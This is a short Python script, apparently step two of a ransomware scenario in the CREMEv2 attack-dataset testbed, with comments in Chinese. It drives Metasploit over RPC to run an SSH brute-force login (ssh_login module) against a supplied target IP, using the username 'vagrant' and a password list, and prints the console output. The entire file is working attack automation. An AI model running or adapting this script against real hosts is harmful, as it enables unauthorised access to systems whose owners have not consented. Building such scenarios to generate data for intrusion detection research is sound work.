import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient

def main(argv):
    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]

    print("--- [Step 2] Starting SSH Brute Force ---")
    
    # 確保密碼檔路徑正確 (使用絕對路徑)
    # 請確保這個路徑是 Kali VM 上真實存在的路徑
    pass_file = '/home/kali/CREMEv2/CREME_backend_execution/scripts/02_scenario/03_ransomware/python_files/attacker_server/unix_passwords_modified.txt'

    client = MsfRpcClient('kali')
    
    # 1. 建立一個新的 Console
    cid = client.consoles.console().cid
    console = client.consoles.console(cid)
    print(f"Console {cid} created.")

    try:
        # 2. 透過 Console 下達設定指令 (比用 module 物件設定更直觀)
        commands = [
            'use auxiliary/scanner/ssh/ssh_login',
            f'set RHOSTS {target_ip}',
            'set RPORT 22',
            'set USERNAME vagrant',
            f'set PASS_FILE {pass_file}',
            'set VERBOSE true',  # 開啟詳細模式
            'run'                # 執行！
        ]

        for cmd in commands:
            console.write(cmd)
            time.sleep(0.5) # 稍微等一下讓指令輸入

        # 3. 建立迴圈，持續讀取輸出 (Polling)
        print("--- Metasploit Output Start ---")
        timeout_counter = 0
        max_timeout = 120 # 最多等 2 分鐘沒輸出就跳出
        
        while True:
            # 讀取 Console 的緩衝區
            result = console.read()
            data = result.get('data', '')
            
            if data:
                print(data, end='') # 直接印出，不換行 (data 本身有換行)
                timeout_counter = 0 # 有讀到東西就重置計時器
                
                # 檢查是否結束的特徵字串 (不同模組可能不同)
                if "Auxiliary module execution completed" in data:
                    print("\n--- Execution Finished ---")
                    break
            else:
                time.sleep(1)
                timeout_counter += 1
                
            if timeout_counter > max_timeout:
                print("\n[Warning] No output for a long time. Stopping...")
                break
                
    except Exception as e:
        print(f"Error: {e}")
    finally:
        # 4. 記得銷毀 Console，以免佔用資源
        print(f"Destroying console {cid}...")
        console.destroy()

    print("--- [Step 2] Completed ---")

main(sys.argv)